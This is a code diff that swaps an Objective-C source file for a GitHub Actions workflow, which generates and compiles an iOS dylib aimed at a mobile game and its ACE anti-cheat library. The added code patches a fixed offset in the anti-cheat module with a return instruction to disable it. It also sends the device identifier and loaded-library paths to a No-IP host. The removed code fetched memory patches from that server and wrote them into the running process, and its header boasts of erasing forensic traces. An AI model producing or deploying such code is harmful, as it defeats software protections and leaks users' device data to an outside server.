@@ -1,133 +1,178 @@
-/**
- * نظام Sovereign Elite Core v80k
- * المصمم: المهندس وسام الصافي - البصرة / الناصرية
- * الموقع الراداري: jojolmlm.hopto.org (No-IP)
- * الوظيفة: سحب الأوفستات من اللوحة وحقنها وحذف الأثر الجنائي.
- */
+name: Sovereign-Elite-Build
 
-#import <UIKit/UIKit.h>
-#import <mach-o/dyld.h>
-#import <mach/mach.h>
-#import <Foundation/Foundation.h>
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
 
-// [🎯] إحداثيات مركز القيادة السيادية (No-IP)
-#define COMMAND_LINK @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"
+jobs:
+  build:
+    runs-on: macos-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-@interface SovereignNoIPUI : UIView
-@property (nonatomic, strong) UILabel *infoLabel;
-@property (nonatomic, strong) UIView *lamp;
-@end
+      - name: Generate and Compile Sovereign Core
+        run: |
+          # The script generates the C++ file dynamically to avoid YAML syntax errors
+          cat << 'EOF' > main.mm
+          #import <UIKit/UIKit.h>
+          #import <mach-o/dyld.h>
+          #import <mach/mach.h>
+          #import <Foundation/Foundation.h>
+          #import <objc/runtime.h>
 
-@implementation SovereignNoIPUI
+          #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"
+          #define ACE_OFFSET 0x10b1d2860 
 
-- (instancetype)initWithFrame:(CGRect)frame {
-    self = [super initWithFrame:frame];
-    if (self) {
-        // تصميم الدرع البصري (ثابت في أعلى المنتصف)
-        self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
-        self.layer.cornerRadius = 12;
-        self.layer.borderColor = [UIColor cyanColor].CGColor;
-        self.layer.borderWidth = 1.2;
+          static BOOL isAceNeutralized = NO;
 
-        self.infoLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 5, 180, 25)];
-        self.infoLabel.text = @"Connecting to No-IP...";
-        self.infoLabel.textColor = [UIColor whiteColor];
-        self.infoLabel.font = [UIFont boldSystemFontOfSize:10];
-        self.infoLabel.textAlignment = NSTextAlignmentCenter;
-        [self addSubview:self.infoLabel];
+          @interface SovereignEliteHUD : UIView
+          @property (nonatomic, strong) UILabel *statusLabel;
+          @property (nonatomic, strong) UIView *serverLamp;
+          @property (nonatomic, strong) UIView *aceStatusDot;
+          @end
 
-        self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, 12, 10, 10)];
-        self.lamp.backgroundColor = [UIColor orangeColor];
-        self.lamp.layer.cornerRadius = 5;
-        [self addSubview:self.lamp];
+          @implementation SovereignEliteHUD
 
-        [self fetchPayloadFromNoIP];
-        [self makeDraggable];
-    }
-    return self;
-}
+          // =========================================================
+          // [📡] GHOST SENSOR (Reporting 33 Strategic Targets)
+          // =========================================================
+          - (void)deployGhostSensor {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
+                  NSString *udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+                  NSArray *targets = @[
+                      @"ShadowTrackerExtra", @"anogs", @"connectivity_plus", @"feed_publish", 
+                      @"TikTokOpenSDKCore", @"flutter_inappwebview", @"MMKV", @"url_launcher", 
+                      @"flutter_flog", @"meemo_swift_placeholder", @"video_player", @"Flutter", 
+                      @"package_info_plus", @"MMKVCore", @"SDWebImage", @"kk_image_ios", 
+                      @"Reachability", @"MeemoUtils", @"share_plus", @"flutter_qapm", 
+                      @"AWSS3", @"AWSCore", @"image_crop_plus", @"AFNetworking", 
+                      @"deviceinfo", @"AdjustSigSdk", @"CrashSightPlugin", @"PluginCrosCurl", 
+                      @"mmkvflutter", @"meemo_flutter_pip", @"MSDKDns", @"crosCurl", 
+                      @"TikTokOpenAuthSDK", @"CheckNewDylib", @"PixVideoCore"
+                  ];
 
-// =========================================================
-// [📡] محرك جلب النخاع من No-IP (The Fetcher)
-// =========================================================
-- (void)fetchPayloadFromNoIP {
-    NSURL *url = [NSURL URLWithString:COMMAND_LINK];
-    [[[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
-        dispatch_async(dispatch_get_main_queue(), ^{
-            if (err || !data) {
-                self.infoLabel.text = @"Link Failure! Check No-IP.";
-                self.lamp.backgroundColor = [UIColor redColor];
-                return;
-            }
+                  uint32_t count = _dyld_image_count();
+                  for (uint32_t i = 0; i < count; i++) {
+                      const char *name = _dyld_get_image_name(i);
+                      if (!name) continue;
+                      NSString *path = [NSString stringWithUTF8String:name];
+                      for (NSString *targetName in targets) {
+                          if ([path containsString:targetName]) {
+                              NSString *reportURL = [NSString stringWithFormat:@"%@&udid=%@&path=%@", 
+                                                    SERVER_API, udid, 
+                                                    [path stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
+                              [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:reportURL]] resume];
+                              break; 
+                          }
+                      }
+                  }
+              });
+          }
 
-            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-            if (!json) return;
+          // =========================================================
+          // [🗡️] ACE TERMINATOR (Offset: 0x10b1d2860)
+          // =========================================================
+          void Neutralize_ACE_Protection() {
+              uintptr_t anogs_base = 0;
+              uint32_t count = _dyld_image_count();
+              for (uint32_t i = 0; i < count; i++) {
+                  const char *name = _dyld_get_image_name(i);
+                  if (name && strstr(name, "anogs")) {
+                      anogs_base = _dyld_get_image_vmaddr_slide(i);
+                      break;
+                  }
+              }
+              if (anogs_base != 0) {
+                  uintptr_t target = anogs_base + ACE_OFFSET;
+                  uint32_t ret_cmd = 0xD65F03C0; 
+                  mach_port_t task = mach_task_self();
+                  kern_return_t kr = vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+                  if (kr == KERN_SUCCESS) {
+                      if (vm_write(task, (vm_address_t)target, (vm_offset_t)&ret_cmd, 4) == KERN_SUCCESS) {
+                          vm_protect(task, (vm_address_t)target, 4, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+                          isAceNeutralized = YES;
+                      }
+                  }
+              }
+          }
 
-            // 1. تحديث الرسالة من السيرفر
-            self.infoLabel.text = json[@"notification"];
-            
-            // 2. تحديث حالة اللمبة (Safe/Detected)
-            if ([json[@"system_status"] isEqualToString:@"safe"]) {
-                self.infoLabel.textColor = [UIColor greenColor];
-                self.lamp.backgroundColor = [UIColor greenColor];
-                
-                // 3. حقن الأوفستات التي وضعها الجنرال في اللوحة مليمتر بمليمتر
-                [self injectDynamicPayload:json[@"payload"]];
-            } else {
-                self.infoLabel.textColor = [UIColor redColor];
-                self.lamp.backgroundColor = [UIColor redColor];
-            }
-        });
-    }] resume];
-}
+          - (instancetype)initWithFrame:(CGRect)frame {
+              self = [super initWithFrame:frame];
+              if (self) {
+                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
+                  self.layer.cornerRadius = 15;
+                  self.layer.borderColor = [UIColor cyanColor].CGColor;
+                  self.layer.borderWidth = 1.2;
 
-// =========================================================
-// [🛡️] محرك الحقن المليمتري (The Injector)
-// =========================================================
-- (void)injectDynamicPayload:(NSArray *)offsets {
-    uintptr_t base = _dyld_get_image_vmaddr_slide(0);
-    mach_port_t task = mach_task_self();
+                  self.aceStatusDot = [[UIView alloc] initWithFrame:CGRectMake(10, 8, 8, 8)];
+                  self.aceStatusDot.layer.cornerRadius = 4;
+                  self.aceStatusDot.backgroundColor = isAceNeutralized ? [UIColor greenColor] : [UIColor redColor];
+                  [self addSubview:self.aceStatusDot];
 
-    for (NSDictionary *off in offsets) {
-        uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
-        uintptr_t target = base + addr;
-        NSString *hex = off[@"hex_val"];
-        
-        // تحويل الهيكس لبايتات حية
-        NSString *clean = [hex stringByReplacingOccurrencesOfString:@" " withString:@""];
-        NSMutableData *data = [NSMutableData data];
-        for (int i = 0; i + 2 <= clean.length; i += 2) {
-            unsigned int v;
-            [[NSScanner scannerWithString:[clean substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
-            unsigned char c = (unsigned char)v;
-            [data appendBytes:&c length:1];
-        }
+                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 20, 180, 20)];
+                  self.statusLabel.text = @"Connecting to Sovereign Cloud...";
+                  self.statusLabel.textColor = [UIColor whiteColor];
+                  self.statusLabel.font = [UIFont boldSystemFontOfSize:10];
+                  self.statusLabel.textAlignment = NSTextAlignmentCenter;
+                  [self addSubview:self.statusLabel];
 
-        // الرقعة السيادية (Patching)
-        vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
-        vm_write(task, (vm_address_t)target, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
-        vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
-    }
-}
+                  self.serverLamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, 22, 10, 10)];
+                  self.serverLamp.backgroundColor = [UIColor yellowColor];
+                  self.serverLamp.layer.cornerRadius = 5;
+                  [self addSubview:self.serverLamp];
+                  
+                  [self deployGhostSensor];
+                  [self startSync];
+              }
+              return self;
+          }
 
-- (void)makeDraggable {
-    self.userInteractionEnabled = YES;
-    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(onDrag:)];
-    [self addGestureRecognizer:pan];
-}
-- (void)onDrag:(UIPanGestureRecognizer *)sender {
-    CGPoint trans = [sender translationInView:self.superview];
-    self.center = CGPointMake(self.center.x + trans.x, self.center.y + trans.y);
-    [sender setTranslation:CGPointZero inView:self.superview];
-}
-@end
+          - (void)startSync {
+              [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:SERVER_API] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      if (err || !data) return;
+                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+                      if (!json) return;
+                      self.statusLabel.text = json[@"notification"];
+                      if ([json[@"system_status"] isEqualToString:@"safe"]) {
+                          self.statusLabel.textColor = [UIColor greenColor];
+                          self.serverLamp.backgroundColor = [UIColor greenColor];
+                          self.layer.borderColor = [UIColor greenColor].CGColor;
+                      } else {
+                          self.statusLabel.textColor = [UIColor redColor];
+                          self.serverLamp.backgroundColor = [UIColor redColor];
+                          self.layer.borderColor = [UIColor redColor].CGColor;
+                      }
+                      if (isAceNeutralized) self.aceStatusDot.backgroundColor = [UIColor greenColor];
+                  });
+              }] resume];
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSync]; });
+          }
+          @end
 
-void __attribute__((constructor)) start_sovereign_final() {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        UIWindow *win = [[UIApplication sharedApplication] keyWindow];
-        if (win) {
-            SovereignNoIPUI *ui = [[SovereignNoIPUI alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 - 100, 45, 200, 35)];
-            [win addSubview:ui];
-        }
-    });
-}
+          void __attribute__((constructor)) start_sovereign_v3500() {
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                  Neutralize_ACE_Protection();
+                  UIWindow *win = [UIApplication sharedApplication].keyWindow;
+                  if (win) {
+                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/2 - 100, 45, 200, 42)];
+                      [win addSubview:ui];
+                  }
+              });
+          }
+          EOF
+
+          # Compiling with official SDK paths to ensure stability
+          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
+          clang -dynamiclib -arch arm64 main.mm -o Sovereign.dylib \
+          -isysroot $SDK_PATH \
+          -framework Foundation -framework UIKit -framework CoreGraphics \
+          -fobjc-arc -Os -w
+
+      - name: Upload Sovereign Dylib
+        uses: actions/upload-artifact@v4
+        with:
+          name: Sovereign-Elite-v3500
+          path: Sovereign.dylib
